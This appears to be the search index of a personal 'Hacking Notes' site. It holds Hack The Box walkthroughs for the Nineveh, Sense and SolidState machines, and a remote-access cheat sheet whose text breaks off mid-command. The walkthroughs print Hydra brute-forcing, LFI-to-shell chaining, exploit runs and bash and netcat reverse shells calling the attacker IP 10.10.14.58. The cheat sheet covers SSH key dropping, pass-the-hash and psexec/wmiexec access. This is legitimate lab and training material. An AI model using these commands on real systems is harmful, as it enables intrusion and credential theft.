{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Hacking Notes Simple notes taken to avoid having to look for information every time. Most of these snippets or techniques are not mine, just taken from other sites to keep my mind organized. General Links Back to Blog Cyberchef ExplainShell","title":"Home"},{"location":"#hacking-notes","text":"Simple notes taken to avoid having to look for information every time. Most of these snippets or techniques are not mine, just taken from other sites to keep my mind organized.","title":"Hacking Notes"},{"location":"#general-links","text":"Back to Blog Cyberchef ExplainShell","title":"General Links"},{"location":"htb/nineveh/","text":"Nineveh Linux Medium Recon Nmap \u2500\u276f sudo nmap -p- -T5 -Pn -sV -sC $target -v Nmap scan report for 10 .129.99.169 Host is up ( 0 .045s latency ) . Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 80 /tcp open http Apache httpd 2 .4.18 (( Ubuntu )) | http-methods: | _ Supported Methods: GET HEAD POST OPTIONS | _http-server-header: Apache/2.4.18 ( Ubuntu ) | _http-title: Site doesn 't have a title (text/html). 443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn' t have a title ( text/html ) . | ssl-cert: Subject: commonName = nineveh.htb/organizationName = HackTheBox Ltd/stateOrProvinceName = Athens/countryName = GR | Issuer: commonName = nineveh.htb/organizationName = HackTheBox Ltd/stateOrProvinceName = Athens/countryName = GR | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2017 -07-01T15:03:30 | Not valid after: 2018 -07-01T15:03:30 | MD5: d182 94b8 0210 7992 bf01 e802 b26f 8639 | _SHA-1: 2275 b03e 27bd 1226 fdaa 8b0f 6de9 84f0 113b 42c0 | _ssl-date: TLS randomness does not represent time | tls-alpn: | _ http/1.1 HTTP We find in the nmap output that ssl cert belongs to commonName=nineveh.htb so we add it to our /etc/hosts Port 80 Fuzzing the site we find a department directory with a login.php page: In the src of the webpage we find the following comment, we can try to bruteforce creds after: <!-- @admin! MySQL is been installed.. please fix the login page! ~amrois --> Port 443 Fuzzing the website on 443 find some directories ffuf -v -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://nineveh.htb/FUZZ -v -c -t 100 ... [ Status: 301 , Size: 309 , Words: 20 , Lines: 10 ] | URL | https://nineveh.htb/db | --> | https://nineveh.htb/db/ * FUZZ: db [ Status: 200 , Size: 49 , Words: 3 , Lines: 2 ] | URL | https://nineveh.htb/ * FUZZ: [ Status: 403 , Size: 300 , Words: 22 , Lines: 12 ] | URL | https://nineveh.htb/server-status * FUZZ: server-status [ Status: 301 , Size: 319 , Words: 20 , Lines: 10 ] | URL | https://nineveh.htb/secure_notes | --> | https://nineveh.htb/secure_notes/ * FUZZ: secure_notes ... On the /db/ directory we find the following phpLiteAdmin Version 1.9 In /secure_notes/ we find an image. Download the image and check its metadata: \u2570\u2500\u276f exiftool nineveh.png ExifTool Version Number : 12 .16 File Name : nineveh.png Directory : . File Size : 2 .8 MiB File Modification Date/Time : 2017 :07:03 01 :50:02+02:00 File Access Date/Time : 2021 :02:18 17 :47:55+01:00 File Inode Change Date/Time : 2021 :02:18 17 :47:50+01:00 File Permissions : rw-r--r-- File Type : PNG File Type Extension : png MIME Type : image/png Image Width : 1497 Image Height : 746 Bit Depth : 8 Color Type : RGB Compression : Deflate/Inflate Filter : Adaptive Interlace : Noninterlaced Significant Bits : 8 8 8 Software : Shutter Warning : [ minor ] Trailer data after PNG IEND chunk Image Size : 1497x746 Megapixels : 1 .1 We see a Warning which told us that there is a trailer data. We extract it with binwalk \u2570\u2500\u276f binwalk nineveh.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 1497 x 746 , 8 -bit/color RGB, non-interlaced 84 0x54 Zlib compressed data, best compression 2881744 0x2BF8D0 POSIX tar archive ( GNU ) Examining the files That is a private ssh key, but port 22 in the machine is not open so we keep it for now. Shell as www-data We try to brute the admin creds with Hydra on the port 80 login.php file \u2570\u2500\u276f hydra nineveh.htb -l admin -P /usr/share/seclists/Passwords/probable-v2-top12000.txt http-post-form \"/department/login.php:username=^USER^&password=^PASS^:Invalid password\" ... [ snip ] ... [ DATA ] attacking http-post-form://nineveh.htb:80/department/login.php:username = ^USER^ & password = ^PASS^:Invalid password [ 80 ][ http-post-form ] host: nineveh.htb login: admin password: 1q2w3e4r5t 1 of 1 target successfully completed, 1 valid password found Hydra ( https://github.com/vanhauser-thc/thc-hydra ) finished at 2021 -02-18 20 :06:42 Then we log and get redirected to http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt After tampering a bit, we find there is a LFI in notes parameter: But we need to upload a PHP file for example, to get a shell with the LFI as there is no SSH port. Coming back into the phpLiteAdmin application, we also bruteforce creds with Hydra finding the password is password123 \u2570\u2500\u276f hydra nineveh.htb -l user -P /usr/share/seclists/Passwords/probable-v2-top12000.txt https-post-form \"/db/index.php:password=^PASS^&proc_login=true:Incorrect password\" ... [ DATA ] attacking http-post-forms://nineveh.htb:443/db/index.php:password = ^PASS^ & proc_login = true:Incorrect password [ 443 ][ http-post-form ] host: nineveh.htb login: user password: password123 1 of 1 target successfully completed, 1 valid password found Hydra ( https://github.com/vanhauser-thc/thc-hydra ) finished at 2021 -02-18 18 :37:37 Now that we have access to phpLiteAdmin, and we confirmed before the version is 1.9, we can find a reliable exploit for this. To exploit it we do the following: Create a new database called test.php Create a table into the database called SHELL Insert PHP code into this table After doing that, we just need to use the LFI found before to call our php file that will execute commands. So we will URL encode a reverse shell in the request. Privesc After transfering the typical enumeration scripts and so, we use Pspy to inspect processes executing in the machine. And we find Root user is using chkrootkit : We find an exploit for this program abusing a non quoted execution. Just need to create a file in /tmp/ called update that will be executed. echo \"/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.58/5555 0>&1' &\" > /tmp/update Wait for the user root to execute chkrootkit and we are done.","title":"Nineveh"},{"location":"htb/nineveh/#nineveh","text":"Linux Medium","title":"Nineveh"},{"location":"htb/nineveh/#recon","text":"Nmap \u2500\u276f sudo nmap -p- -T5 -Pn -sV -sC $target -v Nmap scan report for 10 .129.99.169 Host is up ( 0 .045s latency ) . Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 80 /tcp open http Apache httpd 2 .4.18 (( Ubuntu )) | http-methods: | _ Supported Methods: GET HEAD POST OPTIONS | _http-server-header: Apache/2.4.18 ( Ubuntu ) | _http-title: Site doesn 't have a title (text/html). 443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn' t have a title ( text/html ) . | ssl-cert: Subject: commonName = nineveh.htb/organizationName = HackTheBox Ltd/stateOrProvinceName = Athens/countryName = GR | Issuer: commonName = nineveh.htb/organizationName = HackTheBox Ltd/stateOrProvinceName = Athens/countryName = GR | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2017 -07-01T15:03:30 | Not valid after: 2018 -07-01T15:03:30 | MD5: d182 94b8 0210 7992 bf01 e802 b26f 8639 | _SHA-1: 2275 b03e 27bd 1226 fdaa 8b0f 6de9 84f0 113b 42c0 | _ssl-date: TLS randomness does not represent time | tls-alpn: | _ http/1.1","title":"Recon"},{"location":"htb/nineveh/#http","text":"We find in the nmap output that ssl cert belongs to commonName=nineveh.htb so we add it to our /etc/hosts","title":"HTTP"},{"location":"htb/nineveh/#port-80","text":"Fuzzing the site we find a department directory with a login.php page: In the src of the webpage we find the following comment, we can try to bruteforce creds after: <!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->","title":"Port 80"},{"location":"htb/nineveh/#port-443","text":"Fuzzing the website on 443 find some directories ffuf -v -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://nineveh.htb/FUZZ -v -c -t 100 ... [ Status: 301 , Size: 309 , Words: 20 , Lines: 10 ] | URL | https://nineveh.htb/db | --> | https://nineveh.htb/db/ * FUZZ: db [ Status: 200 , Size: 49 , Words: 3 , Lines: 2 ] | URL | https://nineveh.htb/ * FUZZ: [ Status: 403 , Size: 300 , Words: 22 , Lines: 12 ] | URL | https://nineveh.htb/server-status * FUZZ: server-status [ Status: 301 , Size: 319 , Words: 20 , Lines: 10 ] | URL | https://nineveh.htb/secure_notes | --> | https://nineveh.htb/secure_notes/ * FUZZ: secure_notes ... On the /db/ directory we find the following phpLiteAdmin Version 1.9 In /secure_notes/ we find an image. Download the image and check its metadata: \u2570\u2500\u276f exiftool nineveh.png ExifTool Version Number : 12 .16 File Name : nineveh.png Directory : . File Size : 2 .8 MiB File Modification Date/Time : 2017 :07:03 01 :50:02+02:00 File Access Date/Time : 2021 :02:18 17 :47:55+01:00 File Inode Change Date/Time : 2021 :02:18 17 :47:50+01:00 File Permissions : rw-r--r-- File Type : PNG File Type Extension : png MIME Type : image/png Image Width : 1497 Image Height : 746 Bit Depth : 8 Color Type : RGB Compression : Deflate/Inflate Filter : Adaptive Interlace : Noninterlaced Significant Bits : 8 8 8 Software : Shutter Warning : [ minor ] Trailer data after PNG IEND chunk Image Size : 1497x746 Megapixels : 1 .1 We see a Warning which told us that there is a trailer data. We extract it with binwalk \u2570\u2500\u276f binwalk nineveh.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 1497 x 746 , 8 -bit/color RGB, non-interlaced 84 0x54 Zlib compressed data, best compression 2881744 0x2BF8D0 POSIX tar archive ( GNU ) Examining the files That is a private ssh key, but port 22 in the machine is not open so we keep it for now.","title":"Port 443"},{"location":"htb/nineveh/#shell-as-www-data","text":"We try to brute the admin creds with Hydra on the port 80 login.php file \u2570\u2500\u276f hydra nineveh.htb -l admin -P /usr/share/seclists/Passwords/probable-v2-top12000.txt http-post-form \"/department/login.php:username=^USER^&password=^PASS^:Invalid password\" ... [ snip ] ... [ DATA ] attacking http-post-form://nineveh.htb:80/department/login.php:username = ^USER^ & password = ^PASS^:Invalid password [ 80 ][ http-post-form ] host: nineveh.htb login: admin password: 1q2w3e4r5t 1 of 1 target successfully completed, 1 valid password found Hydra ( https://github.com/vanhauser-thc/thc-hydra ) finished at 2021 -02-18 20 :06:42 Then we log and get redirected to http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt After tampering a bit, we find there is a LFI in notes parameter: But we need to upload a PHP file for example, to get a shell with the LFI as there is no SSH port. Coming back into the phpLiteAdmin application, we also bruteforce creds with Hydra finding the password is password123 \u2570\u2500\u276f hydra nineveh.htb -l user -P /usr/share/seclists/Passwords/probable-v2-top12000.txt https-post-form \"/db/index.php:password=^PASS^&proc_login=true:Incorrect password\" ... [ DATA ] attacking http-post-forms://nineveh.htb:443/db/index.php:password = ^PASS^ & proc_login = true:Incorrect password [ 443 ][ http-post-form ] host: nineveh.htb login: user password: password123 1 of 1 target successfully completed, 1 valid password found Hydra ( https://github.com/vanhauser-thc/thc-hydra ) finished at 2021 -02-18 18 :37:37 Now that we have access to phpLiteAdmin, and we confirmed before the version is 1.9, we can find a reliable exploit for this. To exploit it we do the following: Create a new database called test.php Create a table into the database called SHELL Insert PHP code into this table After doing that, we just need to use the LFI found before to call our php file that will execute commands. So we will URL encode a reverse shell in the request.","title":"Shell as www-data"},{"location":"htb/nineveh/#privesc","text":"After transfering the typical enumeration scripts and so, we use Pspy to inspect processes executing in the machine. And we find Root user is using chkrootkit : We find an exploit for this program abusing a non quoted execution. Just need to create a file in /tmp/ called update that will be executed. echo \"/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.58/5555 0>&1' &\" > /tmp/update Wait for the user root to execute chkrootkit and we are done.","title":"Privesc"},{"location":"htb/sense/","text":"Sense Linux Easy Recon Nmap Nmap scan report for 10.129.99.201 Host is up (0.044s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 80/tcp open http lighttpd 1.4.35 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: lighttpd/1.4.35 |_http-title: Did not follow redirect to https://10.129.99.201/ 443/tcp open ssl/https? | ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US | Issuer: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US | Public Key type: rsa | Public Key bits: 1024 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2017-10-14T19:21:35 | Not valid after: 2023-04-06T19:21:35 | MD5: 65f8 b00f 57d2 3468 2c52 0f44 8110 c622 |_SHA-1: 4f7c 9a75 cb7f 70d3 8087 08cb 8c27 20dc 05f1 bb02 |_ssl-date: TLS randomness does not represent time Port 80 We only get redirects to 443 in this port. Port 443 Directory fuzzing shows some directories: /changelog.txt # Security Changelog ### Issue There was a failure in updating the firewall. Manual patching is therefore required ### Mitigated 2 of 3 vulnerabilities have been patched. ### Timeline The remaining patches will be installed during the next maintenance window Fuzzing deeper we find some text files A user is revelaed so we can login into PfSense with creds rohit:pfsense Exploiting pfSense Searchexploit This command injection seems nice, we try it. \u2570\u2500\u276f python3 43560.py --rhost 10.129.99.201 --lhost 10.10.14.58 --lport 4444 --username rohit --password pfsense CSRF token obtained Running exploit... Exploit completed # On other terminal \u2570\u2500\u276f rlwrap nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.14.58] from (UNKNOWN) [10.129.99.201] 4776 sh: can't access tty; job control turned off id uid=0(root) gid=0(wheel) groups=0(wheel)","title":"Sense"},{"location":"htb/sense/#sense","text":"Linux Easy","title":"Sense"},{"location":"htb/sense/#recon","text":"Nmap Nmap scan report for 10.129.99.201 Host is up (0.044s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 80/tcp open http lighttpd 1.4.35 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: lighttpd/1.4.35 |_http-title: Did not follow redirect to https://10.129.99.201/ 443/tcp open ssl/https? | ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US | Issuer: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US | Public Key type: rsa | Public Key bits: 1024 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2017-10-14T19:21:35 | Not valid after: 2023-04-06T19:21:35 | MD5: 65f8 b00f 57d2 3468 2c52 0f44 8110 c622 |_SHA-1: 4f7c 9a75 cb7f 70d3 8087 08cb 8c27 20dc 05f1 bb02 |_ssl-date: TLS randomness does not represent time","title":"Recon"},{"location":"htb/sense/#port-80","text":"We only get redirects to 443 in this port.","title":"Port 80"},{"location":"htb/sense/#port-443","text":"Directory fuzzing shows some directories: /changelog.txt # Security Changelog ### Issue There was a failure in updating the firewall. Manual patching is therefore required ### Mitigated 2 of 3 vulnerabilities have been patched. ### Timeline The remaining patches will be installed during the next maintenance window Fuzzing deeper we find some text files A user is revelaed so we can login into PfSense with creds rohit:pfsense","title":"Port 443"},{"location":"htb/sense/#exploiting-pfsense","text":"Searchexploit This command injection seems nice, we try it. \u2570\u2500\u276f python3 43560.py --rhost 10.129.99.201 --lhost 10.10.14.58 --lport 4444 --username rohit --password pfsense CSRF token obtained Running exploit... Exploit completed # On other terminal \u2570\u2500\u276f rlwrap nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.14.58] from (UNKNOWN) [10.129.99.201] 4776 sh: can't access tty; job control turned off id uid=0(root) gid=0(wheel) groups=0(wheel)","title":"Exploiting pfSense"},{"location":"htb/solidstate/","text":"SolidState Linux Medium Recon Nmap Nmap scan report for 10.129.29.189 Host is up (0.043s latency). Scanned at 2021-02-18 22:33:54 CET for 418s Not shown: 65528 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) | ssh-hostkey: | 2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5WdwlckuF4slNUO29xOk/Yl/cnXT/p6qwezI0ye+4iRSyor8lhyAEku/yz8KJXtA+ALhL7HwYbD3hDUxDkFw90V1Omdedbk7SxUVBPK2CiDpvXq1+r5fVw26WpTCdawGKkaOMYoSWvliBsbwMLJEUwVbZ/GZ1SUEswpYkyZeiSC1qk72L6CiZ9/5za4MTZw8Cq0akT7G+mX7Qgc+5eOEGcqZt3cBtWzKjHyOZJAEUtwXAHly29KtrPUddXEIF0qJUxKXArEDvsp7OkuQ0fktXXkZuyN/GRFeu3im7uQVuDgiXFKbEfmoQAsvLrR8YiKFUG6QBdI9awwmTkLFbS1Z | 256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISyhm1hXZNQl3cslogs5LKqgWEozfjs3S3aPy4k3riFb6UYu6Q1QsxIEOGBSPAWEkevVz1msTrRRyvHPiUQ+eE= | 256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKbFbK3MJqjMh9oEw/2OVe0isA7e3ruHz5fhUP4cVgY 25/tcp open smtp? |_smtp-commands: Couldn't establish connection on port 25 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Home - Solid State Security 110/tcp open pop3? 119/tcp open nntp? 4555/tcp open rsip? 18683/tcp filtered unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Port 25 / 4555 JAMES Remote Administration Tool 2.3.2 -> James Mail Server Creds root:root (Default creds) We log in to check users and reset their passwords, looking for reading their mail. \u2570\u2500\u276f telnet 10.129.29.189 4555 Trying 10.129.29.189... Connected to 10.129.29.189. Escape character is '^]'. JAMES Remote Administration Tool 2.3.2 Please enter your login and password Login id: root Password: root Welcome root. HELP for a list of commands setpassword mindy pass1234 Password for mindy reset We have luck with mindy's mail. \u2570\u2500\u276f telnet 10.129.29.189 110 Trying 10.129.29.189... Connected to 10.129.29.189. Escape character is '^]'. USER mindy PASS pass1234 LIST +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready +OK +OK Welcome mindy +OK 2 1945 1 1109 2 836 . RETR 1 +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate> MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798 for <mindy@localhost>; Tue, 22 Aug 2017 13:13:42 -0400 (EDT) Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT) From: mailadmin@localhost Subject: Welcome Dear Mindy, Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you. We are looking forward to you joining our team and your success at Solid State Security. Respectfully, James . RETR 2 +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate> MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for <mindy@localhost>; Tue, 22 Aug 2017 13:17:28 -0400 (EDT) Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT) From: mailadmin@localhost Subject: Your Access Dear Mindy, Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. username: mindy pass: P@55W0rd1!2@ Respectfully, James There is also an exploit but it needs user interaction. Shell as mindy We log with the creds mindy:P@55W0rd1!2@ on SSH. But we find we are in a restricted shell After trying several bypasses (from here ), we find that we can log with noprofile on bash. \u2570\u2500\u276f ssh mindy@10.129.29.189 -t 'bash --noprofile' mindy@10.129.29.189's password: ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id uid=1001(mindy) gid=1001(mindy) groups=1001(mindy) Privilege escalation Now with an interactive shell, we enumerate to find a possible privilege escalation. With pspy we find that user root are executing /opt/tmp.py . We have write permissions over this file. ${ debian_chroot :+( $debian_chroot ) } mindy@solidstate:/opt$ ls -ld tmp.py -rwxrwxrwx 1 root root 248 Feb 18 17 :33 tmp.py Adding our reverse shell to script $ { debian_chroot : + ( $ debian_chroot )} mindy @solidstate : / opt $ echo \"os.system('nc -e /bin/bash 10.10.14.58 5555')\" >> tmp . py $ { debian_chroot : + ( $ debian_chroot )} mindy @solidstate : / opt $ cat tmp . py #!/usr/bin/env python import os import sys try : os . system ( 'rm -r /tmp/* ' ) except : sys . exit () os . system ( 'nc -e /bin/bash 10.10.14.58 5555' ) Root reverse shell","title":"Solidstate"},{"location":"htb/solidstate/#solidstate","text":"Linux Medium","title":"SolidState"},{"location":"htb/solidstate/#recon","text":"Nmap Nmap scan report for 10.129.29.189 Host is up (0.043s latency). Scanned at 2021-02-18 22:33:54 CET for 418s Not shown: 65528 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) | ssh-hostkey: | 2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5WdwlckuF4slNUO29xOk/Yl/cnXT/p6qwezI0ye+4iRSyor8lhyAEku/yz8KJXtA+ALhL7HwYbD3hDUxDkFw90V1Omdedbk7SxUVBPK2CiDpvXq1+r5fVw26WpTCdawGKkaOMYoSWvliBsbwMLJEUwVbZ/GZ1SUEswpYkyZeiSC1qk72L6CiZ9/5za4MTZw8Cq0akT7G+mX7Qgc+5eOEGcqZt3cBtWzKjHyOZJAEUtwXAHly29KtrPUddXEIF0qJUxKXArEDvsp7OkuQ0fktXXkZuyN/GRFeu3im7uQVuDgiXFKbEfmoQAsvLrR8YiKFUG6QBdI9awwmTkLFbS1Z | 256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISyhm1hXZNQl3cslogs5LKqgWEozfjs3S3aPy4k3riFb6UYu6Q1QsxIEOGBSPAWEkevVz1msTrRRyvHPiUQ+eE= | 256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKbFbK3MJqjMh9oEw/2OVe0isA7e3ruHz5fhUP4cVgY 25/tcp open smtp? |_smtp-commands: Couldn't establish connection on port 25 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Home - Solid State Security 110/tcp open pop3? 119/tcp open nntp? 4555/tcp open rsip? 18683/tcp filtered unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel","title":"Recon"},{"location":"htb/solidstate/#port-25-4555","text":"JAMES Remote Administration Tool 2.3.2 -> James Mail Server Creds root:root (Default creds) We log in to check users and reset their passwords, looking for reading their mail. \u2570\u2500\u276f telnet 10.129.29.189 4555 Trying 10.129.29.189... Connected to 10.129.29.189. Escape character is '^]'. JAMES Remote Administration Tool 2.3.2 Please enter your login and password Login id: root Password: root Welcome root. HELP for a list of commands setpassword mindy pass1234 Password for mindy reset We have luck with mindy's mail. \u2570\u2500\u276f telnet 10.129.29.189 110 Trying 10.129.29.189... Connected to 10.129.29.189. Escape character is '^]'. USER mindy PASS pass1234 LIST +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready +OK +OK Welcome mindy +OK 2 1945 1 1109 2 836 . RETR 1 +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate> MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798 for <mindy@localhost>; Tue, 22 Aug 2017 13:13:42 -0400 (EDT) Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT) From: mailadmin@localhost Subject: Welcome Dear Mindy, Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you. We are looking forward to you joining our team and your success at Solid State Security. Respectfully, James . RETR 2 +OK Message follows Return-Path: <mailadmin@localhost> Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate> MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for <mindy@localhost>; Tue, 22 Aug 2017 13:17:28 -0400 (EDT) Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT) From: mailadmin@localhost Subject: Your Access Dear Mindy, Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. username: mindy pass: P@55W0rd1!2@ Respectfully, James There is also an exploit but it needs user interaction.","title":"Port 25 / 4555"},{"location":"htb/solidstate/#shell-as-mindy","text":"We log with the creds mindy:P@55W0rd1!2@ on SSH. But we find we are in a restricted shell After trying several bypasses (from here ), we find that we can log with noprofile on bash. \u2570\u2500\u276f ssh mindy@10.129.29.189 -t 'bash --noprofile' mindy@10.129.29.189's password: ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)","title":"Shell as mindy"},{"location":"htb/solidstate/#privilege-escalation","text":"Now with an interactive shell, we enumerate to find a possible privilege escalation. With pspy we find that user root are executing /opt/tmp.py . We have write permissions over this file. ${ debian_chroot :+( $debian_chroot ) } mindy@solidstate:/opt$ ls -ld tmp.py -rwxrwxrwx 1 root root 248 Feb 18 17 :33 tmp.py Adding our reverse shell to script $ { debian_chroot : + ( $ debian_chroot )} mindy @solidstate : / opt $ echo \"os.system('nc -e /bin/bash 10.10.14.58 5555')\" >> tmp . py $ { debian_chroot : + ( $ debian_chroot )} mindy @solidstate : / opt $ cat tmp . py #!/usr/bin/env python import os import sys try : os . system ( 'rm -r /tmp/* ' ) except : sys . exit () os . system ( 'nc -e /bin/bash 10.10.14.58 5555' ) Root reverse shell","title":"Privilege escalation"},{"location":"shells/remote/","text":"Remote access Reverse shells are useful when you does not have credentials or you just exploited a service. Here are listed more methods to access remotely a machine. Linux SSH + Dropping a key If you compromise a user and is a ssh capable user (check for a login shell in /etc/passwd), it is possible to get his ssh key in ~/.ssh/id_rsa if its located in the typical location. If there is no key, it is always possible to drop one with two simple commands: #Create the key ssh-keygen -f ./key #Accept all prompts cat ./key.pub #Copy the public key # In the victim machine echo 'ssh-rsa ...........' > ~/.ssh/authorized_keys # In your machine again chmod 600 key ssh -i key user@machine Windows Below is a table used as a cheatsheet for different ways to connect remotely depending on open ports: RDP Port: 3389 Tools Microsoft RDP Client ( mstsc.exe ) mstsc.exe /v:hostname:port /admin XFreeRDP: xfreerdp /u:user /d:domain /pth:<NTLM> /v:10.0.0.2 RDesktop: rdesktop -g 90% 10.0.0.1 SMB Quote SMB has been leveraged for file administration on Windows and *nix systems for decades. Another feature often abused by attackers is the use of administrative shares (C$, ADMIN$, IPC$) to push a service binary to a target machine, then start the service for semi-interactive I/O. SysInternalsSuite includes the PsExec binary which is largely credited for developing and leveraging this technique. Local administrative privileges are required to push the service binary to the ADMIN$ share, after which an RPC/SVCCTL call creates and starts the remote control service. IPC$ is leveraged to create named pipes for input and output which act as a semi-interactive shell. Credit: https://dolosgroup.io/blog/remote-access-cheat-sheet Port: 445 Tools PsExec.exe \\\\10.0.0.1 -u user -p pass cmd.exe psexec.py 'user':'pass'@10.0.0.1 cmd.exe smbexec.py 'user':'pass'@10.0.0.1 cmd.exe winexe --system --uninstall -U domain/user%pass //10.0.0.1 cmd.exe Info If Credentials with administrative privileges are provided, it is possible to spawn a shell with NT Authority\\System user passing the -s flag to PsExec.exe Also if you are doing this in an interactive command prompt, you could also pass the -i flag to interact with the created process. WinRM Port: 5985/TCP (HTTP), 5986/TCP (HTTPS) Tools evil-winrm Normal login evil-winrm -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' Cert Login evil-winrm -i 10.0.0.1 -c user.crt -k user.key Info It is needed to use -S flag if you are connecting to a HTTPS Endpoint From Windows Machine New-PSSession -Computer IP -Authentication Negotiate -Credential USER | Enter-PSSession In the section changing user context a method to create a Credential object is explained. WMI Port: 135/TCP (RPC), High TCP (DCOM) Tools Impacket-wmiexec Normal wmiexec.py domain/user:pass@target_ip Pass the hash wmiexec.py user@target_ip -hashes LM:NT wmic.exe wmic.exe /USER:\"domain\\user\" /PASSWORD:\"Password\" 